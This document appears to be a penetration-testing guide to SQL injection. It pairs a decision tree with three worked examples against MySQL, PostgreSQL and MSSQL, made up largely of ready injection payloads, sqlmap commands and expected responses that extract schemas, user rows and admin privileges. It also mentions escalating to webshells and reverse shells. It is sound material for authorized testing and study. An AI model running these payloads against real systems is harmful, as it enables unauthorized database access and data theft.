# SQL Injection Decision Tree & Worked Examples

## Master Decision Tree

```
FOUND: User input reflected in application behavior
│
├─ Step 1: DETECT — Is it injectable?
│  ├── Inject ' and " → Error or behavior change? → YES → Go to Step 2
│  ├── Inject ' AND 1=1-- - vs ' AND 1=2-- - → Different responses? → YES (Boolean)
│  ├── Inject ' AND SLEEP(3)-- - → 3s delay? → YES (Time-based)
│  ├── Inject ' ORDER BY 10-- - → Error at some N? → YES (UNION potential)
│  └── All negative? → Try headers (Cookie, Referer, X-Forwarded-For), JSON body, XML
│
├─ Step 2: IDENTIFY — What DBMS is it?
│  ├── Error says "MySQL"/"MariaDB" → MySQL
│  ├── Error says "PostgreSQL" → PostgreSQL
│  ├── Error says "Microsoft SQL Server" → MSSQL
│  ├── Error says "ORA-" → Oracle
│  ├── Error says "SQLite" → SQLite
│  ├── No error? → Behavioral test:
│  │   ├── CONCAT('a','b') works → MySQL or PostgreSQL
│  │   ├── 'a'||'b' = 'ab' → PostgreSQL, Oracle, or SQLite
│  │   ├── 'a'+'b' works → MSSQL
│  │   └── Requires FROM dual → Oracle
│  └── Still unsure? → Let sqlmap detect: sqlmap -u URL --batch --fingerprint
│
├─ Step 3: CHOOSE TECHNIQUE — Best extraction method
│  ├── UNION works (data in response)? → Use UNION (fastest)
│  ├── Errors visible with data? → Use Error-based
│  ├── Boolean difference exists? → Use Boolean-blind (slower)
│  ├── Time delay works? → Use Time-blind (slowest)
│  └── None work locally? → Try OOB (DNS/HTTP exfil)
│
├─ Step 4: ENUMERATE — What's in the database?
│  ├── Extract: current database name
│  ├── Extract: list of all databases
│  ├── Extract: tables in target database
│  ├── Extract: columns in interesting tables (users, admin, credentials)
│  └── Extract: 1-3 sample rows as proof of impact
│
├─ Step 5: ESCALATE (if authorized)
│  ├── Can read files? → Read config files for more credentials
│  ├── Can write files? → Write webshell to web root
│  ├── Can execute OS commands? → Get reverse shell
│  ├── Found credentials? → Try credential reuse on other services
│  └── Found admin hash? → Crack hash → Login to admin panel
│
└─ Step 6: DOCUMENT
   ├── Record all payloads and responses
   ├── Classify: injection type, DBMS, parameter
   ├── Calculate CVSS score based on impact
   └── Generate evidence.json and findings.json
```

## Worked Example 1: UNION-Based MySQL Injection

**Scenario:** Web app with `GET /search?q=test`

```
Step 1: Test injection
  Inject: /search?q=test'
  Response: "You have an error in your SQL syntax..."
  → Injectable! And it's MySQL (from error message)

Step 2: Find column count
  /search?q=test' ORDER BY 1-- -    → 200 OK
  /search?q=test' ORDER BY 5-- -    → 200 OK
  /search?q=test' ORDER BY 6-- -    → 500 Error
  → 5 columns

Step 3: Find displayable columns
  /search?q=test' UNION SELECT 'a',NULL,NULL,NULL,NULL-- -    → No 'a' visible
  /search?q=test' UNION SELECT NULL,'a',NULL,NULL,NULL-- -    → 'a' appears in output!
  → Column 2 is displayable

Step 4: Extract version
  /search?q=test' UNION SELECT NULL,@@version,NULL,NULL,NULL-- -
  → "8.0.32-ubuntu"

Step 5: Extract databases
  /search?q=test' UNION SELECT NULL,GROUP_CONCAT(schema_name),NULL,NULL,NULL FROM information_schema.schemata-- -
  → "information_schema,mysql,performance_schema,webapp_db"

Step 6: Extract tables from webapp_db
  /search?q=test' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL,NULL,NULL FROM information_schema.tables WHERE table_schema='webapp_db'-- -
  → "users,products,orders,sessions"

Step 7: Extract user columns
  /search?q=test' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -
  → "id,username,email,password,role,created_at"

Step 8: Extract proof data (minimal)
  /search?q=test' UNION SELECT NULL,GROUP_CONCAT(username,':',role),NULL,NULL,NULL FROM webapp_db.users LIMIT 3-- -
  → "admin:admin,john:user,jane:user"
```

## Worked Example 2: Blind Boolean-Based PostgreSQL

**Scenario:** Login form `POST /login` with `username=test&password=test`

```
Step 1: Test injection
  username=test' AND '1'='1&password=test    → "Invalid credentials" (normal fail)
  username=test' AND '1'='2&password=test    → "Invalid credentials" (same message)
  username=admin' AND '1'='1&password=test   → "Invalid credentials" (different timing!)
  username=admin' AND '1'='2-- -&password=x  → different response length!
  → Boolean-based blind injection on username param

Step 2: Confirm DBMS
  username=admin' AND 1=(SELECT 1 FROM pg_sleep(0))-- -  → immediate response
  username=admin' AND 1=(SELECT 1 FROM pg_sleep(2))-- -  → 2 second delay
  → PostgreSQL confirmed

Step 3: Extract DB name character by character
  username=admin' AND ASCII(SUBSTRING(current_database(),1,1))>96-- -  → true
  username=admin' AND ASCII(SUBSTRING(current_database(),1,1))>109-- - → false
  username=admin' AND ASCII(SUBSTRING(current_database(),1,1))>103-- - → true
  username=admin' AND ASCII(SUBSTRING(current_database(),1,1))>106-- - → false
  username=admin' AND ASCII(SUBSTRING(current_database(),1,1))=104-- - → true!
  → First char is 'h' (ASCII 104)
  ... continue for remaining characters → "helpdesk"

Step 4: Automate with sqlmap
  sqlmap -u "http://target/login" --data="username=admin&password=test" -p username --dbms=postgresql --batch --dbs
```

## Worked Example 3: Time-Based MSSQL via Cookie Header

**Scenario:** Application uses session cookie, no visible errors

```
Step 1: Baseline
  Cookie: session=abc123    → 200 OK, 150ms response

Step 2: Test injection in cookie
  Cookie: session=abc123'   → 200 OK, 155ms (no error visible)
  Cookie: session=abc123'; WAITFOR DELAY '0:0:3'-- -  → 200 OK, 3150ms!
  → Time-based blind SQLi in Cookie header, likely MSSQL

Step 3: Confirm MSSQL
  Cookie: session=abc123'; IF (1=1) WAITFOR DELAY '0:0:2'-- -  → 2s delay ✓
  Cookie: session=abc123'; IF (1=2) WAITFOR DELAY '0:0:2'-- -  → no delay ✓
  → MSSQL confirmed

Step 4: Check DBA privileges
  Cookie: session=abc123'; IF (IS_SRVROLEMEMBER('sysadmin')=1) WAITFOR DELAY '0:0:2'-- -
  → 2s delay → Current user IS sysadmin!

Step 5: Automate with sqlmap
  sqlmap -u "http://target/" --cookie="session=abc123*" --dbms=mssql --technique=T --time-sec=3 --batch --dbs
  (The * marks the injection point in the cookie)
```

## When to Use sqlmap vs Manual

| Situation | Recommendation |
|-----------|---------------|
| Quick validation needed | Manual — single payload test |
| WAF blocking automated tools | Manual with custom bypass payloads |
| Blind injection extraction | sqlmap — too slow manually |
| Large data extraction | sqlmap with --dump |
| Second-order injection | Manual first, then sqlmap --second-url |
| Header-based injection | sqlmap with --level=3+ |
| JSON/XML body | sqlmap with --data and appropriate content-type |
| CTF/exam with time pressure | sqlmap --batch for speed |
